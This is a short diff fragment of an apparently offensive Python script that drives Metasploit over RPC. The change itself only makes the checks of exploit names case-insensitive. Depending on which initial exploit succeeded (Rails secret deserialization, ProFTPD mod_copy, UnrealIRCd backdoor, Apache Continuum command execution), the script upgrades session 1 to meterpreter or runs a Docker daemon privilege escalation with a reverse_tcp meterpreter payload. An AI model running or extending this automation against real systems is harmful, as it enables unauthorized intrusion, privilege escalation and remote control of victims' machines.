@@ -57,11 +57,11 @@ def main(argv):
 
     # print(client.sessions.list['1'])
     
-    if(FS == "rails_secret_deserialization" or FS == "proftpd_modcopy_exec"):
+    if(FS.lower() == "rails_secret_deserialization" or FS.lower() == "proftpd_modcopy_exec"):
         exploit = client.modules.use('post', 'multi/manage/shell_to_meterpreter')
         exploit['SESSION'] = 1
         exploit.execute()
-    elif(FS == "unreal_ircd_3281_backdoor" or FS == "apache_continuum_cmd_exec"):
+    elif(FS.lower() == "unreal_ircd_3281_backdoor" or FS.lower() == "apache_continuum_cmd_exec"):
         exploit = client.modules.use('exploit', 'linux/local/docker_daemon_privilege_escalation')
         payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
         exploit['SESSION'] = 1
